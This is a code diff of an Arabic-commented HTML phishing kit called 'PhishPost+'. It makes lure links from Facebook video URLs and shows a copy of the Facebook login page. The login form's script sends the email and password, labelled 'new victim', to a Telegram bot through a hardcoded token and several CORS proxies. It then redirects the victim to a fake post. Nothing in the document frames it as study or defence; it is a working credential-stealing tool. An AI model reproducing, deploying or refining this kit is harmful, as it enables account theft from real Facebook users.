@@ -1,211 +1,316 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhishPost+</title>
+    <title>Facebook - log in or sign up</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; }
 
-        /* ========== الصفحة الرئيسية (أداة الصنع) ========== */
-        .gen-panel { max-width: 500px; margin: 40px auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; display: none; }
+        /* ========== أداة توليد الرابط ========== */
+        .gen-panel {
+            display: none;
+            max-width: 500px;
+            margin: 50px auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 25px;
+            text-align: center;
+        }
         .gen-panel.active { display: block; }
-        .gen-panel h2 { color: #1c1e21; margin-bottom: 10px; }
-        .gen-panel p { color: #65676b; margin-bottom: 20px; }
-        .gen-panel input[type="text"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; margin-bottom: 15px; }
-        .gen-panel button { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
-        .result-box { margin-top: 20px; background: #e7f3ff; padding: 15px; border-radius: 6px; display: none; }
-        .result-box input { width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #dddfe2; border-radius: 4px; }
+        .gen-panel h2 { color: #1c1e21; margin-bottom: 10px; font-size: 22px; }
+        .gen-panel p { color: #65676b; margin-bottom: 20px; font-size: 14px; }
+        .gen-panel input[type="text"] {
+            width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px;
+            font-size: 15px; margin-bottom: 15px;
+        }
+        .gen-panel button {
+            background: #1877f2; color: #fff; border: none; padding: 12px 24px;
+            border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%;
+        }
+        .gen-panel button:hover { background: #166fe5; }
+        .result-box {
+            margin-top: 20px; background: #e7f3ff; padding: 15px; border-radius: 6px;
+            display: none; word-break: break-all;
+        }
+        .result-box input {
+            width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #dddfe2;
+            border-radius: 4px; font-size: 13px;
+        }
 
-        /* ========== صفحة تسجيل الدخول (طبق الأصل من فيسبوك) ========== */
-        .login-container { display: none; }
-        .login-container.active { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .login-content { display: flex; max-width: 980px; width: 100%; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-        .login-left { flex: 1; min-width: 300px; padding-left: 20px; }
-        .login-left img { width: 300px; margin-bottom: -10px; }
-        .login-left h2 { font-size: 28px; font-weight: normal; line-height: 32px; color: #1c1e21; width: 500px; max-width: 100%; }
-        .login-right { flex: 0 0 396px; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; text-align: center; }
-        .login-right input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; direction: ltr; text-align: left; }
-        .login-right #loginBtn { background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; padding: 12px; width: 100%; cursor: pointer; }
-        .login-right .forgot { color: #1877f2; font-size: 14px; margin: 16px 0; display: block; text-decoration: none; }
-        .login-right .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
-        .login-right .create-btn { background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; padding: 14px 20px; cursor: pointer; }
+        /* ========== صفحة تسجيل دخول فيسبوك الرسمية ========== */
+        .fb-login-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .fb-login-container.active { display: flex; }
+        .fb-login-inner {
+            display: flex;
+            max-width: 980px;
+            width: 100%;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 40px;
+        }
+        .fb-left {
+            flex: 1 1 400px;
+            max-width: 580px;
+        }
+        .fb-left img {
+            height: 106px;
+            margin: -28px 0 -10px -28px;
+        }
+        .fb-left h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        .fb-right {
+            flex: 0 0 396px;
+        }
+        .fb-box {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .fb-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+        }
+        .fb-box input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .fb-box #loginBtn {
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            line-height: 48px;
+        }
+        .fb-box #loginBtn:hover { background: #166fe5; }
+        .fb-box .forgot {
+            color: #1877f2;
+            font-size: 14px;
+            margin: 16px 0;
+            display: block;
+            text-decoration: none;
+        }
+        .fb-box .forgot:hover { text-decoration: underline; }
+        .fb-box .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .fb-box .create-btn {
+            background: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 20px;
+            cursor: pointer;
+        }
+        .fb-box .create-btn:hover { background: #36a420; }
 
-        /* ========== صفحة المنشور (بعد تسجيل الدخول) ========== */
-        .post-panel { max-width: 500px; margin: 20px auto; background: white; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); display: none; }
+        /* ========== صفحة المنشور بعد تسجيل الدخول ========== */
+        .post-panel {
+            display: none;
+            max-width: 500px;
+            margin: 30px auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
         .post-panel.active { display: block; }
-        .header-post { padding: 10px 16px; display: flex; align-items: center; border-bottom: 1px solid #dddfe2; }
-        .header-post img { width: 40px; height: 40px; border-radius: 50%; margin-right: 8px; }
-        .header-post .name { font-weight: 600; }
-        .header-post .time { font-size: 12px; color: #65676b; }
-        .video-post { width: 100%; height: 300px; background: #000; display: flex; align-items: center; justify-content: center; color: white; font-size: 50px; cursor: pointer; }
-        .actions-post { display: flex; justify-content: space-around; padding: 10px; border-top: 1px solid #dddfe2; font-size: 14px; color: #65676b; }
+        .post-header {
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+        }
+        .post-header img {
+            width: 40px; height: 40px; border-radius: 50%; margin-right: 8px;
+        }
+        .post-header .name { font-weight: 600; font-size: 15px; }
+        .post-header .time { font-size: 12px; color: #65676b; }
+        .post-video {
+            width: 100%; height: 300px; background: #000;
+            display: flex; align-items: center; justify-content: center;
+            color: #fff; font-size: 55px; cursor: pointer;
+        }
+        .post-actions {
+            display: flex;
+            justify-content: space-around;
+            padding: 10px;
+            border-top: 1px solid #dddfe2;
+            font-size: 14px;
+            color: #65676b;
+        }
     </style>
 </head>
 <body>
 
 <!-- ========== أداة الصنع ========== -->
 <div id="genPanel" class="gen-panel active">
-    <h2>🎣 أداة PhishPost+</h2>
-    <p>ألصق رابط فيديو فيسبوك لتحصل على رابط ملغوم مباشر.</p>
-    <input type="text" id="videoUrlInput" placeholder="https://www.facebook.com/watch/?v=123456">
-    <button onclick="generateLink()">أنشئ الرابط الملغوم</button>
+    <h2>🎣 PhishPost+</h2>
+    <p>ألصق رابط فيديو فيسبوك واحصل على رابط ملغوم</p>
+    <input type="text" id="videoUrl" placeholder="https://www.facebook.com/watch/?v=123456">
+    <button id="generateBtn">أنشئ الرابط الملغوم</button>
     <div id="resultBox" class="result-box">
         <strong>الرابط الملغوم:</strong><br>
-        <input type="text" id="phishingLink" readonly onclick="this.select();">
+        <input type="text" id="phishLink" readonly onclick="this.select();">
     </div>
 </div>
 
-<!-- ========== صفحة تسجيل الدخول (طبق الأصل) ========== -->
-<div id="loginContainer" class="login-container">
-    <div class="login-content">
-        <div class="login-left">
+<!-- ========== تسجيل الدخول فيسبوك ========== -->
+<div id="loginContainer" class="fb-login-container">
+    <div class="fb-login-inner">
+        <div class="fb-left">
             <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
             <h2>Connect with friends and the world around you on Facebook.</h2>
         </div>
-        <div class="login-right">
-            <form id="loginForm">
-                <input type="text" name="email" id="emailInput" placeholder="Email or phone number" dir="ltr" required>
-                <input type="password" name="pass" id="passInput" placeholder="Password" dir="ltr" required>
-                <button type="submit" id="loginBtn">Log In</button>
-            </form>
-            <a href="#" class="forgot">Forgot password?</a>
-            <div class="divider"></div>
-            <button class="create-btn">Create new account</button>
+        <div class="fb-right">
+            <div class="fb-box">
+                <form id="loginForm">
+                    <input type="text" id="emailInput" placeholder="Email or phone number" autocomplete="off">
+                    <input type="password" id="passInput" placeholder="Password" autocomplete="off">
+                    <button type="submit" id="loginBtn">Log In</button>
+                </form>
+                <a href="#" class="forgot" onclick="return false;">Forgot password?</a>
+                <div class="divider"></div>
+                <button class="create-btn" onclick="return false;">Create new account</button>
+            </div>
+            <p style="text-align:center; font-size:14px; margin-top:20px;">
+                <strong>Create a Page</strong> for a celebrity, brand or business.
+            </p>
         </div>
     </div>
 </div>
 
-<!-- ========== صفحة المنشور بعد تسجيل الدخول ========== -->
+<!-- ========== صفحة المنشور ========== -->
 <div id="postPanel" class="post-panel">
-    <div class="header-post">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="صفحة">
+    <div class="post-header">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="Page">
         <div>
-            <div class="name">صفحة فيسبوك</div>
-            <div class="time">منذ دقيقتين · 🌍</div>
+            <div class="name">Facebook Page</div>
+            <div class="time">Just now · 🌍</div>
         </div>
     </div>
-    <div class="video-post" onclick="window.open(realVideoUrl, '_blank')">
-        ▶
-    </div>
-    <div class="actions-post">
-        <span>👍 إعجاب</span>
-        <span>💬 تعليق</span>
-        <span>↗️ مشاركة</span>
+    <div class="post-video" onclick="window.open(realVideoUrl, '_blank')">▶</div>
+    <div class="post-actions">
+        <span>👍 Like</span>
+        <span>💬 Comment</span>
+        <span>↗️ Share</span>
     </div>
 </div>
 
 <script>
-    // ========== إعدادات تيليجرام (خاصتك) ==========
-    const TELEGRAM_TOKEN = "8654480187:AAF-vu3ZjbRVBdAUSRA8B3HXE4joSCwjghc";
-    const TELEGRAM_CHAT_ID = "7763665935";
-    // ============================================
+    // ========== إعداداتك ==========
+    const TOKEN = "8654480187:AAF-vu3ZjbRVBdAUSRA8B3HXE4joSCwjghc";
+    const CHAT_ID = "7763665935";
 
     let realVideoUrl = "https://www.facebook.com/";
 
-    // ========== تحديد وضع العرض ==========
-    function detectMode() {
-        const params = new URLSearchParams(window.location.search);
-        const ref = params.get('ref');
-        const logged = params.get('logged');
+    // ========== تحديد وضع الصفحة ==========
+    (function init() {
+        const p = new URLSearchParams(location.search);
+        const ref = p.get('ref');
+        const logged = p.get('logged');
 
         if (ref && logged === '1') {
-            try { realVideoUrl = atob(ref); } catch(e) { realVideoUrl = "https://www.facebook.com/"; }
-            showPostPanel();
+            try { realVideoUrl = atob(ref); } catch(e) {}
+            show('postPanel');
         } else if (ref) {
-            try { realVideoUrl = atob(ref); } catch(e) { realVideoUrl = "https://www.facebook.com/"; }
-            showLoginPanel();
+            try { realVideoUrl = atob(ref); } catch(e) {}
+            show('loginContainer');
         } else {
-            showGenPanel();
+            show('genPanel');
         }
-    }
+    })();
 
-    function showGenPanel() {
-        document.getElementById('genPanel').classList.add('active');
-        document.getElementById('loginContainer').classList.remove('active');
-        document.getElementById('postPanel').classList.remove('active');
+    function show(id) {
+        document.querySelectorAll('#genPanel, #loginContainer, #postPanel').forEach(el => el.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
-
-    function showLoginPanel() {
-        document.getElementById('genPanel').classList.remove('active');
-        document.getElementById('loginContainer').classList.add('active');
-        document.getElementById('postPanel').classList.remove('active');
-    }
-
-    function showPostPanel() {
-        document.getElementById('genPanel').classList.remove('active');
-        document.getElementById('loginContainer').classList.remove('active');
-        document.getElementById('postPanel').classList.add('active');
-    }
-
-    window.onload = detectMode;
 
     // ========== توليد الرابط الملغوم ==========
-    function generateLink() {
-        const videoUrl = document.getElementById('videoUrlInput').value.trim();
-        if (!videoUrl) {
-            alert("يرجى إدخال رابط الفيديو!");
-            return;
-        }
-        const encoded = btoa(videoUrl);
-        const phishingLink = window.location.href.split('?')[0] + "?ref=" + encoded;
-        document.getElementById('phishingLink').value = phishingLink;
+    document.getElementById('generateBtn').addEventListener('click', function() {
+        const url = document.getElementById('videoUrl').value.trim();
+        if (!url) return alert('أدخل رابط الفيديو!');
+        const encoded = btoa(url);
+        const link = location.href.split('?')[0] + '?ref=' + encoded;
+        document.getElementById('phishLink').value = link;
         document.getElementById('resultBox').style.display = 'block';
-    }
+    });
 
     // ========== تنسيق رسالة تيليجرام ==========
-    function formatTelegramMessage(email, password) {
-        const now = new Date();
-        const dateStr = now.toLocaleString('ar-IQ', {
+    function formatMsg(email, pass) {
+        const d = new Date().toLocaleString('ar-IQ', {
             weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
             hour: '2-digit', minute: '2-digit', second: '2-digit'
         });
         return (
             `🔥 *ضحية جديدة فيسبوك* 🔥\n\n` +
-            `📧 *البريد الإلكتروني*:\n\`${email}\`\n\n` +
-            `🔐 *كلمة المرور*:\n\`${password}\`\n\n` +
-            `📅 *التاريخ*: ${dateStr}\n` +
-            `🌐 *المنصة*: Facebook - PhishPost+`
+            `📧 *البريد:* \`${email}\`\n` +
+            `🔐 *كلمة المرور:* \`${pass}\`\n\n` +
+            `📅 ${d}\n🌐 Facebook - PhishPost+`
         );
     }
 
-    // ========== إرسال سريع جداً إلى تيليجرام (متعدد المسارات) ==========
-    async function sendToTelegramQuick(email, password) {
-        const msg = formatTelegramMessage(email, password);
-        const apiBase = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        const query = `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+    // ========== إرسال إلى تيليجرام ==========
+    async function sendTelegram(email, pass) {
+        const msg = formatMsg(email, pass);
+        const base = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const q = `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-        // قائمة المسارات (الأسرع فالأسرع)
         const urls = [
-            `${apiBase}?${query}`,  // مباشر (قد يكون محظوراً)
-            `https://corsproxy.io/?${encodeURIComponent(apiBase + '?' + query)}`,
-            `https://api.allorigins.win/raw?url=${encodeURIComponent(apiBase + '?' + query)}`,
-            `https://proxy.techzbots.com/?${encodeURIComponent(apiBase + '?' + query)}`,
-            `https://yacdn.org/proxy/${apiBase}?${query}`
+            `${base}?${q}`,
+            `https://corsproxy.io/?${encodeURIComponent(base + '?' + q)}`,
+            `https://api.allorigins.win/raw?url=${encodeURIComponent(base + '?' + q)}`,
+            `https://proxy.techzbots.com/?${encodeURIComponent(base + '?' + q)}`,
+            `https://yacdn.org/proxy/${base}?${q}`
         ];
 
-        for (let url of urls) {
+        for (const url of urls) {
             try {
-                const resp = await fetch(url, { mode: 'cors' });
-                if (resp.ok) return;  // نجح الإرسال
-            } catch(e) { /* جرب التالي */ }
+                const r = await fetch(url, { mode: 'cors' });
+                if (r.ok) return;
+            } catch(e) {}
         }
     }
 
-    // ========== حدث تسجيل الدخول ==========
+    // ========== معالجة تسجيل الدخول ==========
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const email = document.getElementById('emailInput').value;
-        const password = document.getElementById('passInput').value;
+        const email = document.getElementById('emailInput').value.trim();
+        const pass = document.getElementById('passInput').value.trim();
+        if (!email || !pass) return;
 
-        // إرسال سريع (لا ننتظر النتيجة)
-        sendToTelegramQuick(email, password);
+        sendTelegram(email, pass);
 
-        // توجيه فوري لصفحة المنشور (نفس الرابط مع logged=1)
-        const currentUrl = new URL(window.location.href);
-        currentUrl.searchParams.set('logged', '1');
-        window.location.href = currentUrl.toString();
+        const u = new URL(location.href);
+        u.searchParams.set('logged', '1');
+        location.href = u.toString();
     });
 </script>
 </body>
